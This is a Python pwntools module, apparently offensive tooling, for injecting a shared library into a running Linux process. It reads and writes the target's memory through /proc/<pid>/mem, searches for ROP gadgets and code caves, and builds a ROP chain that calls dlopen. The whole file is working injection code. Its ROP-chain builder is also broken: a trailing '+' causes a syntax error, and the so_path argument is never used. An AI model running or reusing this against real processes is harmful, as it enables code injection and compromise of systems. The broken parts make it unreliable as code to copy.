from pwn import *

# Constants
PROC_MAPS = "/proc/{}/maps"
PROC_MEM = "/proc/{}/mem"
PROC_SYSCALL = "/proc/{}/syscall"
LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"


class ExploitUtils:
    """
    A class that provides utility functions for process memory manipulation,
    gadget searching, and ROP chain construction.
    """
    def __init__(self, pid):
        self.pid = pid
        self.memory_map = self._parse_maps()
        self.gadget_list = self._initialize_gadgets()

    def _parse_maps(self):
        """
        Parse the /proc/<pid>/maps file and store the relevant information
        in a list of dictionaries representing memory regions.
        """
        memory_map = []
        with open(PROC_MAPS.format(self.pid), "r") as file:
            maps_data = file.read().splitlines()

        for entry in maps_data:
            memory_map.append(self._parse_maps_entry(entry))

        return memory_map

    @staticmethod
    def _parse_maps_entry(mapped_entry: str) -> dict:
        """
        Parse a single entry from the /proc/<pid>/maps file.
        Returns a dictionary with memory region details.
        """
        fields = mapped_entry.split()
        addresses = fields[0].split("-")
        return {
            'start': addresses[0],
            'end': addresses[1],
            'perms': fields[1],
            'name': fields[-1] if len(fields) > 5 else ''
        }

    @staticmethod
    def get_entry_size(maps_entry: dict) -> int:
        """
        Calculate the size of a memory region from a /proc/<pid>/maps entry.
        """
        map_start = int(maps_entry["start"], 16)
        map_end = int(maps_entry["end"], 16)
        return map_end - map_start

    def read_memory(self, address: int, num_bytes: int) -> bytes:
        """
        Read memory from the target process at the specified address.
        """
        with open(PROC_MEM.format(self.pid), 'rb') as mem_file:
            mem_file.seek(address)
            return mem_file.read(num_bytes)

    def write_memory(self, address: int, content: bytes):
        """
        Write memory to the target process at the specified address.
        """
        with open(PROC_MEM.format(self.pid), 'wb') as mem_file:
            mem_file.seek(address)
            mem_file.write(content)

    def find_gadgets(self, gadgets: dict) -> dict:
        """
        Find multiple gadgets in the memory map and return their addresses.
        Returns a dictionary with gadget names as keys and addresses as values.
        """
        found_gadgets = {}
        for gadget_name, gadget_bytes in gadgets.items():
            gadget_addr = self.find_gadget(gadget_bytes, gadget_name)
            if gadget_addr != -1:
                found_gadgets[gadget_name] = gadget_addr

        return found_gadgets

    def find_gadget(self, gadget: bytes, gadget_name: str) -> int:
        """
        Search for a specific gadget (byte sequence) within executable memory regions.
        """
        for entry in self.memory_map:
            if entry["perms"] == "r-xp":  # Executable memory regions
                map_start = int(entry["start"], 16)
                map_size = self.get_entry_size(entry)

                try:
                    mapped_memory = self.read_memory(map_start, map_size)
                except IOError as e:
                    log.warning(f"Error reading memory: {e}")
                    continue

                offset = mapped_memory.find(gadget)
                if offset != -1:
                    gadget_addr = map_start + offset
                    log.info(f"Found {gadget_name} gadget at: {hex(gadget_addr)}")
                    return gadget_addr

        log.warning(f"Gadget {gadget_name} not found.")
        return -1

    def find_cave(self, cave_size: int) -> int:
        """
        Search for a contiguous block of zeroed-out memory (a "cave") of the specified size.
        Returns the address of the cave if found, otherwise -1.
        """
        for entry in self.memory_map:
            if entry["perms"] == "rw-p":  # Writable memory regions
                map_start = int(entry["start"], 16)
                map_size = self.get_entry_size(entry)

                try:
                    rw_memory = self.read_memory(map_start, map_size)
                except IOError as e:
                    log.warning(f"Error reading memory: {e}")
                    continue

                for offset in range(map_size - cave_size + 1):
                    if all(b == 0 for b in rw_memory[offset:offset + cave_size]):
                        cave_addr = map_start + offset
                        log.success(f"Found cave at {hex(cave_addr)}")
                        return cave_addr

        log.warning("Cave not found.")
        return -1

    def parse_proc_syscall(self):
        """
        Parse the /proc/<pid>/syscall file and return a SyscallInfo object.
        """
        syscall_file = PROC_SYSCALL.format(self.pid)
        try:
            with open(syscall_file, 'r') as f:
                content = f.read().split()

            return SyscallInfo(
                syscall_num=int(content[0], 16),
                rdi=int(content[1], 16),
                rsi=int(content[2], 16),
                rdx=int(content[3], 16),
                r10=int(content[4], 16),
                r8=int(content[5], 16),
                r9=int(content[6], 16),
                rsp=int(content[7], 16),
                rip=int(content[8], 16),
            )
        except (IOError, IndexError) as e:
            log.warning(f"Error parsing syscall: {e}")
            return None

    def locate_dlopen(self, libc_base: int) -> int:
        """
        Locate the address of dlopen in the target libc.
        """
        libc = ELF(LIBC_PATH, checksec=False)
        libc.address = libc_base
        dlopen_addr = libc.symbols['dlopen']
        log.info(f"dlopen address: {hex(dlopen_addr)}")
        return dlopen_addr

    def dlopen_rop(self, address: int, so_path: str, user_gadgets=None):
        """
        Construct a ROP chain to call dlopen with the given shared object path.
        """
        gadgets_to_find = user_gadgets if user_gadgets else self.gadget_list
        found_gadgets = self.find_gadgets(gadgets=gadgets_to_find)
        libc_base = self._find_libc_base()

        dlopen_addr = self.locate_dlopen(libc_base)
        rop_chain = (
            p64(found_gadgets["nop"]) +
            p64(found_gadgets["pop_rax"]) +
            p64(dlopen_addr) +
            p64(found_gadgets["pop_rdi"]) +
            p64(address) +
            p64(found_gadgets["pop_rsi"]) +
            p64(os.RTLD_LAZY) +
            p64(found_gadgets["jmp_rax"]) +
        )
        return rop_chain

    def _find_libc_base(self):
        """
        Locate libc base address from memory map.
        """
        libc_entry = next((e for e in self.memory_map if 'libc.so.6' in e['name'] and e['perms'] == 'r--p'), None)
        if not libc_entry:
            log.warning("Could not find libc base address")
            return None
        return int(libc_entry["start"], 16)

    @staticmethod
    def _initialize_gadgets():
        """
        Initialize default gadget byte sequences for ROP chains.
        """
        return {
            "nop": b"\x90\xc3",  # nop; ret;
            "jmp_rax": b"\xff\xe0",  # jmp rax;
            "pop_rsi": b"\x5e\xc3",  # pop rsi; ret;
            "pop_rdi": b"\x5f\xc3",  # pop rdi; ret;
            "pop_rax": b"\x58\xc3"  # pop rax; ret;
        }


class SyscallInfo:
    """
    Represents a syscall and its associated register values.
    """
    def __init__(self, syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip):
        self.syscall_num = syscall_num
        self.rdi = rdi
        self.rsi = rsi
        self.rdx = rdx
        self.r10 = r10
        self.r8 = r8
        self.r9 = r9
        self.rsp = rsp
        self.rip = rip
